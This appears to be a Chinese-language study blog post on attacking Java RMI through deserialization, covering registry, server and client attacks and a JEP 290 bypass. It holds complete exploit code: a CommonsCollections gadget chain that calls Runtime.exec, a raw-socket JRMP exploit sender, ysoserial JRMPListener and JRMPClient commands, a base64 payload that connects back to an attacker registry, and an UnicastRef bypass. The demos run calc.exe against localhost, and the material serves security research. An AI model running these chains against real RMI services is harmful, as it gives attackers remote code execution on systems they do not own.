---
created: '21/11/18'
title: RMI
tags:
  - java
  - java安全
---
# RMI
我们知道RMI在整个调用流程时都会出现序列化和反序列化，那么我们就可以从中利用反序列化漏洞

## 攻击方法
### 服务端攻击注册中心
当服务端在bind时，实际上也是向注册中心序列化传输对象，注册中心再将其反序列化，那么我们就可以利用这个漏洞来攻击注册中心(JEP 290之前)。

注册中心代码:
```java
package top.longlone.RMIStudy;

import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;

public class RMIRegistry {
    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(2099);
        } catch (RemoteException e) {
            e.printStackTrace();
        }
        while (true) ;
    }
}
```
服务器构造一个恶意对象并将其传输给注册中心，这里需要注意的是这个对象需要实现了Remote接口，所以我们这里使用了动态代理的技术，将恶意的类套在AnnotationInvocationHandler的map中，再动态代理实现Remote接口使用:
```java
package top.longlone.RMIStudy;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

public class HelloServer {
    public static void main(String[] args) throws Exception {
        try {

            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
            };
            Transformer transformer = new ChainedTransformer(transformers);
            Map innerMap = new HashMap();
            Map ouputMap = LazyMap.decorate(innerMap, transformer);

            TiedMapEntry tiedMapEntry = new TiedMapEntry(ouputMap, "pwn");
            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);

            Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
            field.setAccessible(true);
            field.set(badAttributeValueExpException, tiedMapEntry);

            Map tmpMap = new HashMap();
            tmpMap.put("pwn", badAttributeValueExpException);
            Constructor<?> ctor = null;
            ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
            ctor.setAccessible(true);
            InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override.class, tmpMap);
            Remote remote = Remote.class.cast(Proxy.newProxyInstance(HelloServer.class.getClassLoader(), new Class[]{Remote.class}, invocationHandler));
            Registry registry = LocateRegistry.getRegistry(2099);
            registry.bind("hello1", remote);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
#### 攻击流程
1. 开启注册中心
2. 运行服务端代码
3. 注册中心反序列化，弹出计算器

其触发的反序列化位置在`sun.rmi.registry.RegistryImpl_Skel#dispatch`:
![](https://gitee.com/guuest/images/raw/master/img/20211118110403.png)


### 注册中心攻击服务端
参考[这篇文章](https://mp.weixin.qq.com/s/Ww_IxNLXI0KWZYERGwu3bg)

根据上文我们可以看到我们的代码中使用了`registry.bind`，其实际上调用的原生的`RegistryImpl_Stub`，会触发`UnicastRef#invoke->StreamRemoteCall#executeCall`导致反序列化，也就是说当我们服务端攻击注册中心时注册中心也可能会对我们进行攻击。
比如我们常用的ysoserial中的`RMIRegistryExploit`，其代码如下:
```java
 public static void main(final String[] args) throws Exception {
  final String host = args[0];
  final int port = Integer.parseInt(args[1]);
  final String command = args[3];
  Registry registry = LocateRegistry.getRegistry(host, port);
  final String className = CommonsCollections1.class.getPackage().getName() +  "." + args[2];
  final Class<? extends ObjectPayload> payloadClass = (Class<? extends ObjectPayload>) Class.forName(className);

  // test RMI registry connection and upgrade to SSL connection on fail
  try {
   registry.list();
  } catch(ConnectIOException ex) {
   registry = LocateRegistry.getRegistry(host, port, new RMISSLClientSocketFactory());
  }

  // ensure payload doesn't detonate during construction or deserialization
  exploit(registry, payloadClass, command);
 }

 public static void exploit(final Registry registry,
   final Class<? extends ObjectPayload> payloadClass,
   final String command) throws Exception {
  new ExecCheckingSecurityManager().callWrapped(new Callable<Void>(){public Void call() throws Exception {
   ObjectPayload payloadObj = payloadClass.newInstance();
            Object payload = payloadObj.getObject(command);
   String name = "pwned" + System.nanoTime();
   Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);
   try {
    registry.bind(name, remote);
   } catch (Throwable e) {
    e.printStackTrace();
   }
   Utils.releasePayload(payloadObj, payload);
   return null;
  }});
 }
```
可以看到ysoserial也使用了`registry.list`和`registry.bind`，所以也存在漏洞。

#### 攻击流程
1. 使用ysoserial启动一个恶意的注册中心: `java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 calc.exe`
2. 稍微修改上面的服务端代码，将命令执行改为`notepad.exe`，然后运行
3. 服务端反序列化，弹出计算器(而非记事本)


#### ysoserial反制与防范
根据上文所说，注册中心和服务端实际上是能够互相攻击的，也就是说当我们攻击的时候，我们也可能遭受攻击。

那么我们要如何避免这种情况呢？答案是用socket模拟JRMP协议发包，其实与后面文章中**客户端攻击注册中心**的ysoserial中exploit/JRMPClient的代码类似，只是我们触发反序列化点的方式不一样。
这里也参考了[attack-rmi-registry-and-server-with-socket](https://xz.aliyun.com/t/8247)与ysoserial中exploit/JRMPClient的代码，稍作修改即可，通过手动模拟JRMP发包作为恶意服务端发送一个bind请求攻击注册中心，防止了反制。
```java
package top.longlone.RMIStudy;

import sun.rmi.server.MarshalOutputStream;
import sun.rmi.transport.TransportConstants;
import top.longlone.CC5;

import javax.net.SocketFactory;
import java.io.DataOutputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;

public class JRMPRegistryExploit {
    public static void main(String[] args) throws Exception {
        if (args.length == 0) {
            // 如果不指定连接参数默认连接本地RMI服务
            args = new String[]{"127.0.0.1", String.valueOf(1099), "calc.exe"};
        }

        // 远程RMI服务IP
        final String host = args[0];

        // 远程RMI服务端口
        final int port = Integer.parseInt(args[1]);

        // 需要执行的系统命令
        final String command = args[2];

        Socket s = null;
        DataOutputStream dos = null;

        try {
            // 创建恶意的Payload对象
            Object payloadObject = CC5.getPayload(command);

            InetSocketAddress isa = new InetSocketAddress(host, port);
            // 建立和远程RMI服务的Socket连接
            s = SocketFactory.getDefault().createSocket(host, port);
            s.setKeepAlive(true);
            s.setTcpNoDelay(true);

            // 获取Socket的输出流对象
            OutputStream os = s.getOutputStream();

            // 将Socket的输出流转换成DataOutputStream对象
            dos = new DataOutputStream(os);


            // 向远程RMI服务端Socket写入RMI协议并通过JRMP传输Payload序列化对象
            dos.writeInt(TransportConstants.Magic);// 魔数
            dos.writeShort(TransportConstants.Version);// 版本
            dos.writeByte(TransportConstants.SingleOpProtocol);// 协议类型
            dos.write(TransportConstants.Call);// RMI调用指令

            ObjectOutputStream objOut = new MarshalOutputStream(dos);

            objOut.writeLong(0); // RegistryImpl_Skel
            objOut.writeInt(0);
            objOut.writeLong(0);
            objOut.writeShort(0);
            objOut.writeInt(0); // bind
            objOut.writeLong(4905912898345647071L);// 接口Hash值，这里是固定的
            // 写入恶意的序列化对象
            objOut.writeObject(payloadObject);
            os.flush();
        } finally {
            // 关闭Socket输出流
            if (dos != null) {
                dos.close();
            }

            // 关闭Socket连接
            if (s != null) {
                s.close();
            }
        }
    }
}
```

### 注册中心攻击客户端
这个攻击一般是以下流程: 我们利用远程服务器的反序列化漏洞，让其作为客户端主动连接我们本地的恶意注册中心，注册中心再返回一个恶意构造的序列化对象，客户端将其反序列化从而最终造成反序列化漏洞，常用于绕过waf和测试gadget

在了解这个攻击方式之前，我们需要去了解RMI协议，参考文章: [attack-rmi-registry-and-server-with-socket](https://xz.aliyun.com/t/8247)
具体代码参考ysoserial中的exploit/JRMPListener。
#### 攻击流程
1. 运行`java -jar ysoserial.jar JRMPClient 127.0.0.1:2099 | base64 -w 0`生成一段恶意序列化对象让其回连我们的恶意注册中心
2. 运行`java -cp ysoserial.jar ysoserial.exploit.JRMPListener 2099 CommonsCollections5 "calc.exe"`启动一个恶意的注册中心
3. 手动模拟反序列化漏洞点
 ```java
package top.longlone.RMIStudy;

import sun.misc.BASE64Decoder;

import java.io.*;

public class vuln {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        // 上述base64之后的序列化对象，其会回连我们127.0.0.1:2099的恶意注册中心
        byte[] data = new BASE64Decoder().decodeBuffer("rO0ABXN9AAAAAQAaamF2YS5ybWkucmVnaXN0cnkuUmVnaXN0cnl4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcgAtamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdEludm9jYXRpb25IYW5kbGVyAAAAAAAAAAICAAB4cgAcamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdNNhtJEMYTMeAwAAeHB3MgAKVW5pY2FzdFJlZgAJMTI3LjAuMC4xAAAIMwAAAABkqebwAAAAAAAAAAAAAAAAAAAAeA==");
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
        ois.readObject();

    }
}
 ```
4. 运行上述代码，成功在客户端弹出计算器:
    ![](https://gitee.com/guuest/images/raw/master/img/20211118112950.png)
其触发反序列化的位置在`sun.rmi.registry.RegistryImpl_Stub#lookup`:
![](https://gitee.com/guuest/images/raw/master/img/20211118113332.png)

### 客户端攻击注册中心
这种攻击方式不太常见(因为注册中心一般不可能暴露在外网)，我们这里来模拟攻击一下:

在了解这个攻击方式之前，我们同样需要去了解RMI协议，参考文章: [attack-rmi-registry-and-server-with-socket](https://xz.aliyun.com/t/8247)
具体代码参考ysoserial中的exploit/JRMPClient。

#### 攻击流程
1. 运行开头的注册中心代码，启动一个正常的注册中心
2. 运行`java -cp ysoserial.jar ysoserial.exploit.JRMPClient 127.0.0.1 2099 CommonsCollections5 "calc.exe"`，成功在注册中心弹出计算器

其原理是RMI框架采用DGC(Distributed Garbage Collection)分布式垃圾收集机制来管理远程对象的生命周期,可以通过与DGC通信的方式发送恶意payload让注册中心反序列化。

其触发反序列化的位置在`sun.rmi.transport.DGCImpl_Skel#dispatch`:
![](https://gitee.com/guuest/images/raw/master/img/20211118114147.png)





## JEP290
参考一些师傅的文章，在JDK8u121，JDK7u13，JDK6u141之后添加了一个新的安全机制JEP290，核心其实就是增加了一个 `ObjectInputFilter` 接口，可以将 filter 设置给 `ObjectInputStream` 对象，在反序列化的时候触发 filter 的检测机制。
这个过滤的白名单我们最终可以在`RegistryImpl#registryFilter` 方法中看到:
![](https://gitee.com/guuest/images/raw/master/img/20211119182902.png)

白名单的内容如下:
```
String / Number / Remote / Proxy / UnicastRef / RMIClientSocketFactory / RMIServerSocketFactory /  ActivationID / UID
```
只要反序列化的类不是白名单中的类，就会返回 `REJECTED` 操作符，表示序列化流中有不合法的内容，直接抛出异常。

## Bypass 8u121~8u230
### UnicastRef 类
UnicastRef 是在白名单上的，RMI Server 或者 Client 和 Registry 的通信就基于它。也就是说我们只要通过在目标上反序列化这个类，它就会发起一个JRMP连接，请求我们控制的恶意注册中心，这也是我们**注册中心攻击客户端**的原理。


### RemoteObject 类
RemoteObject 是一个抽象类，在后面的 Bypass 思路构造中它会扮演一个很重要的角色。它实现了 Remote 和 Serializable 接口，代表它（及其子类）可以通过白名单的检测，而 Bypass 利用的关键点就是它的 readObject 方法。我们编写以下代码手动模拟攻击:
```java
package top.longlone.RMIStudy;

import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;

public class RMIRegistry {
    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(2099);
        } catch (RemoteException e) {
            e.printStackTrace();
        }
        while (true) ;
    }
}
```

```java
package top.longlone.RMIStudy;

import sun.misc.BASE64Decoder;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.io.*;
import java.rmi.AlreadyBoundException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

public class vuln {
    public static void main(String[] args) throws IOException, ClassNotFoundException, AlreadyBoundException {
        Registry registry = LocateRegistry.getRegistry(2099);
        ObjID id = new ObjID(new Random().nextInt());
        TCPEndpoint te = new TCPEndpoint("127.0.0.1", 9999);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler(ref);
        // lookup方法也可以，但需要手动模拟lookup方法的流程
        registry.rebind("pwn", handler);

    }
}
```
调试过程如下:
用ysoserial启动JRMPClient，然后调试RMIRegistry，在`RemoteObject#readObject`方法中下断点，最后再运行vuln触发断点。
![](https://gitee.com/guuest/images/raw/master/img/20211119192153.png)
跟进readExternal方法:
![](https://gitee.com/guuest/images/raw/master/img/20211119192454.png)
在这个方法中会读出序列化流中的 host 和端口信息，然后重新封装成一个 LiveRef 对象，将其存储到当前的 ConnectionInputStream 上，调用 saveRef 方法:
![](https://gitee.com/guuest/images/raw/master/img/20211119192545.png)
一直跟进到RegistryImpl_Skel的oldDispatch方法:
![](https://gitee.com/guuest/images/raw/master/img/20211119192746.png)
在服务端触发了反序列化之后，来到 `StreamRemoteCall#releaseInputStream` 方法中，在这里会调用 `ConnectionInputStream#registerRefs` 方法:
![](https://gitee.com/guuest/images/raw/master/img/20211119193033.png)
这里又会调用DGCClient的registerRefs方法:
![](https://gitee.com/guuest/images/raw/master/img/20211119193137.png)
最终由 DGCClient 向恶意的 JRMP 注册中心发起 lookup 连接:
![](https://gitee.com/guuest/images/raw/master/img/20211119193200.png)
这里的攻击方法看起来与上面的**注册中心攻击客户端**有点类似，但是这里用的不是直接反序列化而是通过往注册中心rebind恶意对象触发反序列化造成的，其最终目的都是为了**让服务端变为JRMP客户端向我们恶意的JRMPRegistry发起JRMP请求**。
## 总结
所以 Bypass JEP290 的关键在于：**通过反序列化让服务端变为JRMP客户端向我们恶意的JRMPRegistry发起 JRMP 请求。**


## Bypass 8u231~8u240
使用了UnicastRemoteObject，后补

## 参考文章
1. https://paper.seebug.org/1194
2. https://xz.aliyun.com/t/8247